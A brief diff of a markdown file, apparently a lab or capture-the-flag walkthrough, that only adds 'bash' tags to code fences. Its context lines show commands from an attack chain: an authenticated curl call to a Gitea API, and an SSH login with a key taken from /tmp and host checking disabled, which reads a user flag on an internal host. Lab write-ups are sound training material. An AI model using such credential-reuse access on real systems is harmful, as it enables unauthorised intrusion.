@@ -351,11 +351,11 @@ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
   | python3 -c "import sys,json; d=json.load(sys.stdin); print('state:', d.get('state'))"
 ```
 
-```
+```bash
 sleep 15
 ```
 
-```
+```bash
 ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; cat ~/user.txt'
 ```
 <div align="center">
